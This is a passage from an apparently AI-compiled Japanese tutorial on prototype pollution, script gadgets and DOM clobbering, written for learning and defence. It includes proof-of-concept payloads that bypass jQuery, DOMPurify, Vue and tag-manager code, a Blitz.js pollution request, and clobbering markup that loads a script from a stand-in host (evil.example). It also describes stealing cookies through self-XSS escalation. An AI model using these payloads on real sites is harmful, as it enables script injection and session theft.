console.log({}.isAdmin); // true ← 何もしていない全く別のオブジェクトが汚染されている
```

なぜこれが動くのでしょうか。`source` のキーが `"__proto__"` という文字列だった場合、多くの実行環境では `target["__proto__"]` へのプロパティアクセス（代入）が、そのオブジェクト自身に `__proto__` という名前のプロパティを作るのではなく、**そのオブジェクトの内部的な `[[Prototype]]` を書き換えるアクセサとして解釈されます**（`Object.prototype.__proto__` は getter/setter として定義されているため）。つまり `target.__proto__.isAdmin = true` は「`target` のプロトタイプ（多くの場合 `Object.prototype` そのもの）に `isAdmin` プロパティを生やせ」という意味になり、以後アプリケーション内で作られる**あらゆる**プレーンオブジェクトが、自分自身には定義していない `isAdmin` プロパティを継承して持つようになります。これが「オブジェクトのキー処理の再帰マージ」がプロトタイプ汚染の典型的な原因になる理由です。

同様の効果は `constructor.prototype` という経路からも得られます。すべてのオブジェクトは `constructor` プロパティ経由で自分を生成したコンストラクタ関数（例えば `Object`）にアクセスでき、コンストラクタは `prototype` プロパティ経由で共有プロトタイプにアクセスできます。したがって `obj["constructor"]["prototype"]["isAdmin"] = true` も `__proto__` と同じ結果になります。`__proto__` という文字列だけをブラックリストでフィルタしても `constructor.prototype` 経由の迂回を防げない、という点が防御の落とし穴としてよく挙げられます。

### 2. クライアントサイドでの汚染経路

サーバーサイド（Node.jsのJSONマージ処理など）でのプロトタイプ汚染も重要ですが、本節ではXSSに直結する「クライアントサイド・プロトタイプ汚染」に焦点を当てます。クライアントサイドでの典型的な汚染源は、URLのクエリ文字列やハッシュフラグメントをオブジェクトに変換する処理（パーサ）です。

```
https://example.com/?__proto__[test]=test
https://example.com/#__proto__[test]=test
https://example.com/?constructor[prototype][test]=test
```

多くのJavaScriptライブラリは、`location.search` や `location.hash` を読み取り、`a[b]=c` のようなブラケット記法をネストしたオブジェクトへ変換する独自パーサを実装しています。この変換処理が `__proto__` や `constructor` というキー名を特別扱いせずに再帰的にオブジェクトへ代入してしまうと、URLパラメータを操作するだけで `Object.prototype` を汚染できてしまいます。攻撃者はサーバーへのリクエストを一切必要とせず、被害者にリンクをクリックさせるだけで攻撃を成立させられる点が特徴です。

### 3. 汚染だけでは攻撃にならない：ガジェットの必要性

ここで重要な原理があります。プロトタイプ汚染は「任意のプロパティ値を全オブジェクトに継承させられる」という状態を作るだけであり、それ自体はコード実行を意味しません。攻撃が成立するには、**汚染したプロパティを、危険な形で参照・利用してくれる既存のコードパス**が必要です。これを「script gadget（スクリプトガジェット）」と呼びます。

ガジェットの探索は、静的にコードを読むか、動的にプロトタイプの各プロパティを次々汚染しながらDOM変化を観察するファジングによって行われます。ガジェットが成立する条件は概ね次の3点です。

1. アプリケーションが `obj.someProperty` のように、あるオブジェクトのプロパティを読み取る際、そのオブジェクト自身が `someProperty` を持っているかを `hasOwnProperty` などで厳密にチェックしていない（プロトタイプチェーンをたどって値を拾ってしまう）。
2. 読み取られた値が、`innerHTML` への代入、`eval`、`<script src>` の生成、DOM要素の属性設定など、最終的にHTML/JSとして解釈される sink（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`）に渡される。
3. 攻撃者がそのプロパティ名をURLなどから制御できる。

### 4. 代表的なクライアントサイドガジェット集

以下は、実際に発見・報告された著名なライブラリのガジェットです。いずれも「プロトタイプ汚染＋既存コード」の組み合わせでXSSに到達する仕組みを示しています。

#### 4.1 jQuery系ガジェット

```
?__proto__[context]=<img/src/onerror=alert(1)>&__proto__[jquery]=x
```
jQueryの内部初期化処理は、`this.context` のようなプロパティが自身に存在しない場合、プロトタイプに存在する値を読み取ってDOM要素構築のコンテキストとして利用することがあります。汚染した `context` に不正なHTML文字列を仕込むことで、jQueryが内部でその文字列をHTMLとして解釈し、`onerror` ハンドラのJavaScriptが実行されます。

```
?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
```
jQuery 3.0.0以降の `$.get()` 内部処理では、明示的に渡されなかった `url` や `dataType` の値をオプションオブジェクトのプロトタイプから継承して読み取ります。`dataType` を `"script"` に汚染すると、取得したレスポンスを `<script>` として実行させる分岐に強制的に入り、`data:` スキームURLを介して任意コードが実行されます。

#### 4.2 HTMLサニタイザのバイパス

サニタイザ（危険なタグ・属性を除去してHTMLを「無害化」するライブラリ）自体はXSS対策として使われますが、その設定値がプロトタイプ汚染で書き換え可能な設計になっていると、対策そのものが無効化されます。

```
// DOMPurify <= 2.0.12
?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
```
DOMPurifyは許可する属性のホワイトリストをオプションオブジェクトから読み込みますが、呼び出し側が明示的に `ALLOWED_ATTR` を渡していない場合、内部でデフォルト値とオプションオブジェクトをマージする際にプロトタイプ由来の値を採用してしまう実装がありました（2020年頃に修正）。これにより、本来除去されるはずの `onerror` 属性がホワイトリストに追加され、サニタイズ後もペイロードが生き残ります。

```
// sanitize-html
?__proto__[*][]=onload
```
ワイルドカード（`*`）キーで全タグに対する許可属性を追加できてしまう設計を突いた例で、`onload` のようなイベントハンドラ属性を全タグで許可させます。

これらはいずれも「防御機構自身の設定がプロトタイプチェーン経由で書き換え可能」という、防御実装の落とし穴を示す重要な事例です。**サニタイザのオプション読み込みロジックには常に `Object.create(null)` ベースの安全なデフォルトオブジェクトを使うべき**、という教訓が得られます。

#### 4.3 フレームワーク（Vue.js）のガジェット

```
?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()
```
Vue.jsのテンプレートコンパイル・レンダリング処理の中には、コンポーネントのオプションが未指定の場合にプロトタイプ由来のプロパティを参照してしまう箇所があり、汚染した属性値の中に文字列から関数オブジェクトを生成する `''.constructor.constructor(...)`（`Function` コンストラクタを介した動的コード生成の定石）を仕込むことで、テンプレート評価時に任意コードが実行されます。

#### 4.4 解析系・トラッキング系タグのガジェット

```
// Google Tag Manager 系
?__proto__[srcdoc]=<script>alert(1)</script>
```
`iframe.srcdoc` に代入された文字列は、その `iframe` 内で通常のHTMLドキュメントとして解釈・実行されます。タグ生成ロジックが `srcdoc` オプションを未指定時にプロトタイプから継承してしまうと、攻撃者が注入したHTML/JSがiframe内で実行されます。

### 5. これらの事例が示す「原理」のまとめ

上記の多様なガジェットに共通する原理は次の通りです。

- **信頼境界の消失**：本来「このオブジェクトに書き込んだ値だけを信頼する」という前提でコードが書かれていても、`in` 演算子や `for...in` ループ、あるいは単純な `obj.prop` 参照はプロトタイプチェーンを区別しません。`obj.hasOwnProperty('prop')` を使わない限り、そのオブジェクト自身が持つ値なのか、遥か上流の `Object.prototype` から継承しているだけの値なのかをコードは区別できません。
- **設定のデフォルト値パターンの危険性**：`const opts = Object.assign({}, defaults, userOptions)` のようなマージパターンや、「未指定ならプロトタイプの値にフォールバック」という一見自然な設計が、汚染された `Object.prototype` を「グローバルなデフォルト値ストア」として悪用可能にしてしまいます。
- **sinkへの到達**：汚染だけでは無害であり、`innerHTML`、`document.write`、`eval`、動的 `<script>` 生成などの危険なsinkに汚染値が流れ込む経路（ガジェット）が揃って初めてXSSが成立します。

### 6. 防御策

1. **パース処理でのキーフィルタリング**：URLやJSONを再帰的にオブジェクト化する自作パーサでは、`__proto__`・`constructor`・`prototype` というキー名を明示的に拒否する。ブラックリストは迂回されやすいため、可能であれば `Object.create(null)` で作った「プロトタイプを持たない」オブジェクトに結果を格納する。
2. **`Object.freeze(Object.prototype)`**：アプリケーション起動時に組み込んでおくと、以後の汚染の書き込み自体をエラーにできる（ただし副作用の検証が必要）。
3. **`hasOwnProperty` の徹底**：プロパティ参照時に、そのオブジェクト自身が値を持っているかを厳密にチェックするコーディング規約を徹底する。
4. **サードパーティライブラリのバージョン管理**：jQuery、DOMPurify、Lodashなど過去にプロトタイプ汚染関連の脆弱性（例: CVE-2021-20083〜20089など複数のCVEが割り当てられている）が報告されたライブラリは、修正済みバージョンへの追随を継続する。
5. **CSP（Content-Security-Policy）は保険であって根本対策ではない**：ガジェットが `eval` 系やインラインイベントハンドラを経由する場合、厳格なCSPが被害を軽減することがあるが、`srcdoc` や `data:` スキームを使った経路など、CSPの適用範囲外・許可設定の解釈次第で回避されるケースもあるため過信は禁物。

### 7. 参考資料

BlackFanのリポジトリは、上記のようなクライアントサイドプロトタイプ汚染ガジェットを継続的に収集・カタログ化したものです。2020年前後に多数のjQueryプラグイン、Web解析タグ、UIライブラリのガジェットが報告され、Wistia、Swiftype、HubSpot、Mutiny、Twitter Universal Website Tag、hCaptchaなど実際のサービスで修正が行われました。この分野の探索・報告に関わった研究者（Sergey Bobrov、Masato Kinugawaなど）による発見の蓄積が、現在のガジェットカタログの土台になっています。

> 出典: client-side-prototype-pollution — https://github.com/BlackFan/client-side-prototype-pollution

s1r1usのブログ記事は、脆弱性報奨金制度（VDP: Vulnerability Disclosure Program）を対象に大規模にプロトタイプ汚染をハントした実践研究で、独自ツールを用いて1,000件を超えるサイトで汚染可能な箇所を発見し、その中からガジェットが存在し実際に金銭的報奨につながった1件のケーススタディ（自己XSSからアカウント乗っ取りへのエスカレーション、SAMLログインを利用したセッション奪取を含む）を詳細に解説しています。最終的にこの案件は4,000ドルの報奨金を獲得したと報告されています。この記事は「汚染は見つかるがガジェットが見つからない」「見つかったガジェットの影響を最大化する（自己XSSからアカウント乗っ取りへ格上げする）」という、実際のバグバウンティにおける典型的な壁とその突破方法を示す点で価値があります。

> ⚠️ **未取得の資料**: 「s1r1us: Prototype Pollution 大規模ハント研究」（https://blog.s1r1us.ninja/research/PP）は自動取得できませんでした（理由: 本環境のegressプロキシによりドメインがブロックされているため）。詳細な技術内容（使用した検出ツールの実装詳細、具体的なガジェット発見コード、エスカレーション手順の全ステップ）については、以下のURLからユーザーご自身で直接ご覧ください: https://blog.s1r1us.ninja/research/PP
>
> （以下は未取得資料の補足として一般知識に基づく解説です）本記事のような大規模ハント手法は、一般に (1) 対象サイトのURLに `?__proto__[polluted]=true` のようなプローブパラメータを付与して自動巡回する、(2) ページ読み込み後に `window.polluted` あるいは `Object.prototype.polluted` の値をヘッドレスブラウザで検査し汚染の成否を機械的に判定する、(3) 汚染に成功したサイトについてのみ、次に既知のガジェットパターン（本節4章で挙げたようなjQuery/Vue/サニタイザ系のパターン）を順番に試し、DOM変化やアラート発火を検知する、という3段階のパイプラインで構成されるのが一般的です。自己XSSをアカウント乗っ取りに格上げする際の常套手段は、汚染したページを攻撃者が用意した非表示のiframeやポップアップウィンドウとして被害者に開かせ、被害者のセッションで実行されたJavaScriptからCookieやトークン、あるいはpostMessage経由でDOM内の機密情報を窃取する、というものです。SAML SSOのようなシングルサインオン導線がある場合、ログイン後にリダイレクトされる先のページで汚染とガジェットを発火させることで、通常は直接アクセスできない社内システムや管理画面のコンテキストでコードを実行できることがあり、報奨金額が跳ね上がる典型パターンとして知られています。

---

## プロトタイプ汚染 実践とRCE事例

これまでの章で扱ってきたXSSは、攻撃者が入力した文字列がそのままHTMLやJavaScriptとして**sink**（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`, `eval`, `document.write`）に流れ込むことで発火するものでした。本節で扱う**プロトタイプ汚染（Prototype Pollution, PP）**は、これとは質的に異なる脆弱性です。攻撃者は文字列を直接実行させるのではなく、JavaScriptの言語仕様そのもの――**プロトタイプチェーン**というオブジェクトの継承の仕組み――を汚染し、アプリケーションが「当然安全なはず」と信じているデフォルト値やオプション値を密かに差し替えます。汚染そのものは無害に見えますが、汚染された値を読み出して実行してしまう既存コード（**gadget**、汚染された値を実際の攻撃に変換するコード片）と組み合わさった瞬間、XSSやリモートコード実行（RCE）に発展します。

### 4-1. プロトタイプ汚染の仕組み（原理編）

JavaScriptのすべてのオブジェクトは、暗黙のリンクである `[[Prototype]]`（多くの実装で `__proto__` プロパティとして参照可能）を通じて別のオブジェクトに連結されています。`obj.foo` というプロパティアクセスが行われたとき、エンジンはまず `obj` 自身が `foo` を持つか（own property）を調べ、なければ `obj.__proto__`、さらにその `__proto__`……という具合に**プロトタイプチェーン**を辿ります。この連鎖の終点にあるのが `Object.prototype` で、素のオブジェクトリテラル `{}` を含め、ほぼすべてのオブジェクトは最終的にここへたどり着きます。

問題は、**再帰的なマージ・クローン処理**（例: `lodash.merge`、`$.extend`、自作の `deepMerge` 関数）や、クエリ文字列・JSONを `key.subkey.subsubkey` のようなパスに分解してオブジェクトへ書き込む処理にあります。攻撃者がキーとして `__proto__`（あるいは `constructor.prototype`）を送り込むと、本来は「新しいプロパティを追加するだけ」のつもりだったコードが、実際には `Object.prototype` に対して書き込みを行ってしまいます。

```javascript
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]); // 再帰
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
// => これ以降、あらゆる空オブジェクト {} が isAdmin === true を持つ
console.log({}.isAdmin); // true
```

なぜこれが「なぜ動くか」というと、`for...in` ループは列挙可能なプロパティを列挙し、`target["__proto__"]` への代入はブラケット記法であってもJavaScriptエンジン内部では「このオブジェクトのプロトタイプを差し替える」特別な意味を持つためです（`Object.prototype.__proto__` はアクセサプロパティとして定義されている）。結果として、`merge` 関数はローカル変数を汚したつもりが、グローバルに共有される `Object.prototype` そのものを書き換えてしまいます。以降、アプリケーション中の**あらゆる**素のオブジェクトが `isAdmin: true` を継承します。

汚染自体は「値が勝手に増える」だけなので即座には害がありません。実害を生むのは、汚染されたプロパティを**チェックなしで信頼して読む**コード、すなわち **gadget** です。

### 4-2. クライアントサイドPPからXSSへ

> 出典: HackTricks — Client Side Prototype Pollution — https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html

#### 汚染源（sources）とgadgetの分離モデル

HackTricksはクライアントサイドPPを「**汚染源**」と「**gadget**」の二段構成で捉えることを推奨しています。汚染源として典型的なのは次の4つです。

- `location.hash` / `location.search`（URLのクエリ文字列やフラグメントをパースしてオブジェクト化する処理）
- `postMessage`（クロスオリジンメッセージングで受け取ったJSONをマージする処理）
- フォームシリアライザー（フォーム入力値をオブジェクト化するライブラリ）
- 複数オブジェクトを統合するJSONマージ処理

攻撃者はまずURL一つで完結する汚染源を探します。典型的な悪用URLは次の形です。

```
https://victim.example/?__proto__[transport_url]=data:,alert(1)//
```

これがフレームワーク側のクエリパーサ（`qs` や自作パーサ）によって `{__proto__: {transport_url: "data:,alert(1)//"}}` へ変換され、`Object.prototype.transport_url` が汚染されます。

#### 代表的なgadgetパターン

**gadget例1: `fetch()` のオプションオブジェクト経由**

```javascript
Object.prototype.body = "name=<img src=x onerror=alert(1)>";
fetch("/endpoint", { method: "POST" }); // bodyを明示していない
```

`fetch` の第2引数オブジェクトに `body` プロパティが存在しなければ、JavaScriptのプロパティ探索がプロトタイプチェーンを辿り、汚染された `body` を継承してしまいます。これは「オブジェクトのown propertyしかチェックしない」設計と「未指定オプションはプロトタイプ由来でも読み込まれる」というJS仕様の組み合わせが原因です。

**gadget例2: `Object.defineProperty` の記述子欠落**

```javascript
Object.prototype.value = '<img src=x onerror=alert(1)>';
const victim = {};
Object.defineProperty(victim, "html", { configurable: false, writable: false });
```

`defineProperty` の第3引数（プロパティ記述子）に `value` キーが明示されていない場合、デフォルトで `undefined` になるのではなく、プロトタイプ経由の値を継承する実装が存在し、意図しない値が設定されます。

**gadget例3: サニタイザーのホワイトリスト設定の汚染**

```html
<script>
  Object.prototype["* ONERROR"] = 1;
  Object.prototype["* SRC"] = 1;
</script>
<script src="https://google.github.io/closure-library/source/closure/goog/base.js"></script>
```

一部のHTMLサニタイザー（`sanitize-html`, DOMPurify等）は「許可するタグ・属性」の設定をオブジェクトのプロパティとして保持しています。この設定オブジェクトが `hasOwnProperty` によるチェックを経ずに参照されると、攻撃者はプロトタイプ経由で「`onerror` 属性を許可する」設定を割り込ませ、サニタイズをすり抜けさせられます。これはCSP（Content Security Policy）やDOMPurifyが「入力文字列」だけを検査対象にしており、「サニタイザー自身の設定オブジェクトの整合性」までは検査しないという盲点を突くものです。

#### 検出ツールとデバッグ手法

実務では、DOM InvaderやBurp Suite、`ppfuzz`/`ppmap`/`proto-find`のような自動化ツールで汚染可能な入力を探索したのち、以下のようなアクセサ差し込みによって「どのコードが汚染プロパティを読んでいるか」をスタックトレースで特定します。

```javascript
Object.defineProperty(Object.prototype, "potentialGadget", {
  __proto__: null,
  get() {
    console.trace(); // どこからアクセスされたかを可視化
    return "test";
  },
});
```

これにより、`get` トラップが発火した瞬間のコールスタックを確認でき、ライブラリコード中の「無検証読み出し箇所」を効率的に特定できます。

#### 2024年以降の研究動向

HackTricksが引用するGaLAフレームワークの研究では、100万サイトを対象にクライアントサイドPPを走査し、**133個のゼロデイgadget**を発見、23サイトを「無害」から「実運用的にエクスプロイト可能」に変化させたと報告されています。重要な指摘は、**被害はXSSに限らない**という点です。Meta社の `fbevents.js` では汚染された配列要素が `document.cookie` に到達する事例が確認され、Vue.jsのgadgetは **CVE-2024-6783** として認定されました。したがって狩猟時は `innerHTML` や `script.src` だけでなく、`document.cookie` への書き込み、リダイレクト先URLの構築、`setTimeout`/`eval` への値渡しも確認対象に含める必要があります。

#### 防御策

- プロパティアクセス前に `Object.prototype.hasOwnProperty.call(obj, key)` で own property であることを明示的に確認する。
- オプションオブジェクトを生成する際は `Object.create(null)` を使い、そもそもプロトタイプを持たないオブジェクトにする。
- 必須プロパティは呼び出し側で全て明示し、「未指定なら継承される」余地を作らない。
- `JSON.parse` のリバイバーやマージ処理で `__proto__` / `constructor` / `prototype` というキー名を明示的に拒否する。

### 4-3. Beyond XSS: URLだけで完結するPP起点のXSSチェーン

> ⚠️ **未取得の資料に関する補足**: 「Beyond XSS — Prototype Pollution」（https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/）は、このセッションの環境からは直接取得できませんでした（理由: 当該ドメインがネットワークegressプロキシによりブロックされているため）。GitHub上のミラー取得も404で失敗しました。以下のURLからユーザーご自身で直接ご覧いただくことを推奨します: https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/
>
> 以下はWeb検索で得られた要約情報と、（以下は未取得資料の補足として一般知識に基づく解説です）著者aszx87410氏の他章（DOM Clobbering章など、同シリーズ内で言及される関連概念)から構成した技術的解説です。原文の一次情報としては必ずリンク先をご確認ください。

Beyond XSSのPrototype Pollution章は、「攻撃者はJavaScriptを一切実行させずに、URLを一つ送るだけで被害者のブラウザ上でPP起点のXSSを成立させられる」という実践的な攻撃チェーンを解説しています。核となる考え方は次の通りです。

1. **フロントエンドのルーティングライブラリやユーティリティ関数**（多くはURLのクエリ文字列を再帰的にオブジェクト化する）が汚染源になる。
2. 被害者に `https://victim.example/?__proto__[foo]=bar` のようなURLを踏ませるだけで、被害者のブラウザ内で `Object.prototype` が汚染される。
3. ページ内のどこかで `innerHTML` に代入されているオプション値（例: テンプレートエンジンやUIライブラリが「デフォルトHTML」として使う設定値）が、この汚染されたプロパティを継承し、結果としてペイロードが `innerHTML` に渡ってXSSが発火する。

これは反射型XSSと違い、**サーバー側の入力検証を一切経由しない**点が重要です。攻撃対象はサーバーのレスポンスではなく、クライアント側のJavaScriptコードの「オブジェクトの扱い方」そのものです。したがってサーバーサイドでどれだけ入力をエスケープしていても、フロントエンドのマージ・パース処理に脆弱性があれば防げません。また同章はDOM Clobbering（HTML要素のid/name属性がグローバル変数やDOM APIの結果を上書きする手法）とPPを組み合わせることで、CSPが有効な環境でも「script gadgetを踏ませてalert()相当のJS実行に到達できる」ケースにも言及しており、CSPは「外部スクリプトの読み込み元」を制限する仕組みであって、「読み込み済みJSコードのオブジェクト操作」までは防げないという原理的な限界を浮き彫りにしています。

### 4-4. Blitz.js プロトタイプ汚染によるRCE（サーバーサイド, 2022年公開）

> 出典: Sonar — Remote Code Execution via Prototype Pollution in Blitz.js — https://www.sonarsource.com/blog/blitzjs-prototype-pollution/

**対象バージョン**: Blitz.js 0.x系（`superjson` を用いたRPC引数のデシリアライズ処理を持つバージョン）。**公開年**: 2022年7月。**修正状況**: Blitz.jsは `__proto__` / `constructor` / `prototype` をパス名として使用できないようブロックする形で修正済み。

Blitz.jsはNext.jsベースのフルスタックフレームワークで、フロントエンドからバックエンドの関数を直接呼び出せる「Zero-API」設計を特徴としています。この通信のシリアライズ形式として、標準の `JSON` を拡張した独自形式 **superjson** を使用しており、循環参照やDate・Map・Setなど、通常のJSONでは表現できない型をサポートするため、「メタデータとして**代入操作のパス一覧**を送り、受信側でそれをデータへ適用する」という設計になっていました。

#### 脆弱性の仕組み

superjsonのデシリアライズ処理は、リクエストに含まれるメタデータの中の**パス文字列を検証なしにオブジェクトへの代入操作として実行**していました。パスの各セグメントは任意のプロパティ名を取り得るため、攻撃者は次のようなパスを送信できます。

```json
{
  "json": { "data": "x" },
  "meta": {
    "values": {
      "__proto__.polluted": [["set"]]
    }
  }
}
```

「代入先パスに任意のプロパティ名を指定できる」という設計が、パス中に `__proto__.x` を含めるだけで `Object.prototype.x` への書き込みを許してしまう、という典型的なPPの構図をサーバーサイドで再現しています。クライアントサイドの場合と原理は同一で、**再帰的なプロパティ書き込み処理が、パスの途中に現れる `__proto__` という名前を特別扱いせずそのまま辿ってしまう**ことが根本原因です。

#### RCEへのエスカレーション

汚染したプロパティ単体では任意コード実行にはなりません。Sonarのリサーチチームが発見したのは、**汚染されたJSONリクエストをサーバーへ送ると、Blitz.jsのルーティング機構が汚染済みのプロトタイプを保持した状態でサーバー側のJavaScriptモジュールを読み込む**という連鎖です。具体的には、Node.jsのモジュール解決やNext.jsのルーティング内部処理が、汚染されたプロパティ（例えばモジュールの設定やパス解決に使われる値）をチェックなしに利用しており、攻撃者はこれを使ってサーバー側で読み込まれるコードパスを操作し、最終的に**任意のシステムコマンド実行（RCE）**へとつなげることに成功しました。ここでの「なぜRCEに到達できるか」のポイントは、**プロトタイプ汚染 → 信頼された内部設定値のすり替え → その値を使ってサーバーが動的にコードや設定を読み込む** という「gadgetチェーンがサーバー内部の奥深く（モジュールローダーやルーター）にまで存在した」という点です。クライアントサイドの `innerHTML` gadgetと構造的には同じですが、到達点がブラウザではなくNode.jsプロセスであるためRCEに直結しました。

#### 修正

Blitz.jsは根本原因への対処として、代入操作のパスに `__proto__`、`constructor`、`prototype` という名前が現れた場合にそれを拒否するフィルタを実装しました。これにより、たとえsuperjsonの再帰的代入ロジック自体は変更せずとも、プロトタイプチェーンへ到達する経路そのものを塞ぐことで脆弱性を解消しています。この対処法は、クライアントサイドPPの防御策で述べた「危険なキー名の明示的な拒否」と本質的に同じ考え方であり、**PP対策は「汚染源での入口対策」と「gadget側での出口対策」の両方を行うのが理想的**であることを示す好例です。

### 4-5. まとめ: PPからXSS/RCEへの共通原理

3つの資料に共通するのは、プロトタイプ汚染そのものは「オブジェクトへの書き込みバグ」に過ぎず、**実際の脅威度は、その汚染値をノーチェックで信頼して使う既存コード（gadget）の有無で決まる**という構図です。攻撃者視点では「汚染源を1つ見つける」ことと「gadgetを1つ見つける」ことは別々のスキルであり、両者を繋ぎ合わせて初めてPoCが成立します。防御側は、(1) `__proto__`/`constructor`/`prototype` を汚染源で明示的に拒否する、(2) gadget側では `hasOwnProperty` チェックや `Object.create(null)` でプロトタイプ継承を断つ、という**入口・出口の二重対策**を徹底することが、クライアントサイドXSSからサーバーサイドRCEまで共通して有効な防御になります。

---

## DOM Clobbering

### 概要:「スクリプトなしのXSS」という矛盾

DOM Clobbering(DOMクロベリング)は、`<script>`タグや`javascript:`スキームなど、いわゆる「スクリプト」を一切使わずに、HTMLマークアップの注入だけでJavaScriptの実行フローを乗っ取る攻撃手法です。多くの防御策(HTMLサニタイザ、CSPのscript-src制限)は「スクリプトの実行を防ぐ」ことに主眼を置いていますが、DOM Clobberingはスクリプトを実行するのではなく、既存の正規スクリプトが参照する変数やプロパティの「値」を、HTML要素で意図的に上書き(clobber)します。結果として、開発者が「ここは安全な組み込みAPIか、まだ未定義の変数のはずだ」と信じているオブジェクトが、攻撃者の用意した`<a>`や`<form>`要素にすり替わり、最終的に`innerHTML`への代入やスクリプトの動的ロードなど、危険なsink(入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`、`eval()`、`script.src`)に攻撃者の値が流れ込みます。

本節では、この攻撃が成立する仕組み(ブラウザの「名前付きプロパティ」機構)を核として、実際に野生で発見された脆弱性(Gmail AMP4Email)、体系化された防御策(OWASP)、そして研究コミュニティが収集した実例集(DOM Clobbering Collection)の3つの資料をもとに、原理から実践までを解説します。

### 仕組みの核心:名前付きプロパティアクセス(Named Property Access)

DOM Clobberingを理解する鍵は、HTML仕様(WHATWG HTML Standard)が定義する「**名前付きプロパティ可視性アルゴリズム(named property visibility algorithm)**」です。ブラウザはDOMツリーを構築する際、`id`または`name`属性を持つ一部のHTML要素について、その値をキーとして`document`オブジェクトおよび(条件付きで)`window`オブジェクトに自動的にアクセサを生やします。

```html
<form id="x"></form>
```

このHTMLがページに存在するだけで、JavaScript側では以下がすべて成立します。

```js
document.x   // <form id="x">要素を参照
window.x     // 同上(グローバルスコープにxという変数が未宣言の場合)
x            // グローバル変数として同上
```

> なぜ動くか: HTML仕様が`HTMLDocument`と`Window`インターフェースに「名前付きプロパティ」というブラウザ組み込みの仕組みを定義しており、`id`/`name`属性を持つ要素が自動的にそのプロパティ値として登録されるため。これはJavaScriptの通常の変数宣言とは無関係に、パーサがHTMLを解釈した時点で発生する。

重要なのは、**この名前付き要素参照が、開発者が明示的に宣言していない変数(未定義のグローバル変数)よりも先に、あるいはそれに代わって解決される**という点です。たとえばコードが

```js
let redirectTo = window.redirectTo || '/profile/';
location.assign(redirectTo);
```

のように「`window.redirectTo`が定義されていればそれを使い、なければデフォルト値を使う」という一見安全なロジックを書いていたとしても、攻撃者が事前にHTMLインジェクションで

```html
<a id="redirectTo" href="javascript:alert(document.domain)"></a>
```

を注入していれば、`window.redirectTo`は文字列ではなく**この`<a>`要素そのもの**(`HTMLAnchorElement`オブジェクト)になります。この要素はtruthyな値であるため`||`の右辺には進まず、`location.assign()`に要素オブジェクトが渡されます。多くのブラウザAPIはオブジェクトを暗黙的に`toString()`し、`HTMLAnchorElement`の`toString()`は`href`属性の値(絶対URL化されたもの)を返すため、結果として`location.assign("javascript:alert(document.domain)")`相当の呼び出しが発生し、XSSが成立します。

もう一つの典型パターンとして、ネストした`id`属性による「オブジェクトのプロパティまで汚染する」テクニックがあります。

```html
<a id="config"></a>
<a id="config" name="url" href="https://evil.example/malicious.js"></a>
```

> なぜ動くか: 同じ`id`を持つ要素が複数存在する場合、ブラウザは`HTMLCollection`(疑似配列)を`document.config`として返す。さらにその`HTMLCollection`に対して`name`属性で追加のプロパティアクセスが定義されるため、`document.config.url`のようなネストしたプロパティパスまで攻撃者が構築できる。これにより`window.config.url || 'script.js'`のような「設定オブジェクトのプロパティを読む」コードまで乗っ取り可能になる。

コードが

```js
var s = document.createElement('script');
let src = window.config.url || 'script.js';
s.src = src;
document.body.appendChild(s);
```

のようにconfigオブジェクトのプロパティから動的スクリプトのURLを決定していた場合、上記の注入により任意のリモートJavaScriptを読み込ませることができ、HTMLインジェクションのみからフルのコード実行(XSS)に到達します。

### 攻撃が成立する前提条件

DOM Clobberingは万能ではなく、以下の条件が揃って初めて成立します。

1. **スクリプトタグの直接注入ができない状況であること**: サニタイザやCSPによって`<script>`や`on*`属性、`javascript:`スキームは弾かれるが、`<a>`や`<form>`、`<img>`のような一見無害なタグの`id`/`name`属性は許可されている、という「中途半端なサニタイズ」の場面で威力を発揮します。
2. **ターゲットのJavaScriptコードが、グローバルスコープの変数・組み込みAPI・`document`/`window`のプロパティを「型チェックなしに」信頼して使っていること**。特に、変数が「まだ定義されていないかもしれない」という前提で`||`や`??`によるデフォルト値パターンを書いているコードは典型的な標的です。
3. **開発者が「名前付きプロパティ」というブラウザの挙動そのものを認識していないこと**。これは言語仕様のグレーゾーンであり、通常のセキュアコーディング教育では見落とされがちです。

### 実例1: Gmail AMP4EmailにおけるDOM Clobbering(Michał Bentkowski, Securitum)

> ⚠️ **未取得の資料**: 「XSS in GMail's AMP4Email via DOM Clobbering」(Securitum, Michał Bentkowski)は自動取得できませんでした(理由: 対象ドメイン`research.securitum.com`が本環境のegressプロキシによりブロックされているため)。以下のURLからユーザーご自身で直接ご覧ください: https://research.securitum.com/xss-in-amp4email-dom-clobbering/

(以下は未取得資料の補足として、Web検索で得られた二次情報および一般知識に基づく解説です)

2019年8月、セキュリティ研究者Michał Bentkowski(Securitum)は、GmailのAMP4Email(「ダイナミックメール」とも呼ばれる、メール本文にAMP HTMLを埋め込んで動的コンテンツを表示できるGoogleの機能)においてDOM ClobberingによるXSSを発見し、Google Vulnerability Reward Program(VRP)に報告しました。Googleは2019年10月12日までに修正を完了し、Bentkowskiは2019年11月18日に詳細を公開、報奨金5,000ドルを獲得しています。

AMP4Emailは、メール本文というきわめて信頼できない入力(送信者が完全に内容を制御できる)からHTMLを描画するにもかかわらず動的な挙動を許すという、構造的にリスクの高い機能でした。そのためGoogleはあらかじめDOM Clobbering対策として、`id`属性に`"AMP"`のような特定の予約語を使うことを**禁止するフィルタ**を実装していました。これは「AMPランタイムの内部変数名を`id`属性で上書きされる」典型的なDOM Clobberingを防ぐ意図です。

しかし、Bentkowskiはこのフィルタが`"AMP"`という文字列は弾くものの、`"AMP_MODE"`という別の内部識別子までは想定していないことを発見しました。攻撃者が

```html
<a id="AMP_MODE"></a>
```

を注入すると、AMPランタイム内部で`AMP_MODE`というグローバル変数(本来はAMPの実行モード情報を保持するオブジェクト)にアクセスしようとした際、それが`<a>`要素にclobberされ、その結果としてAMPが動的スクリプトを読み込むためのURL構築ロジックの一部が`undefined`という文字列を含んだまま実行され、コンソールにスクリプト読み込みエラー(URLの一部が`undefined`になっている404エラー)が出力されました。

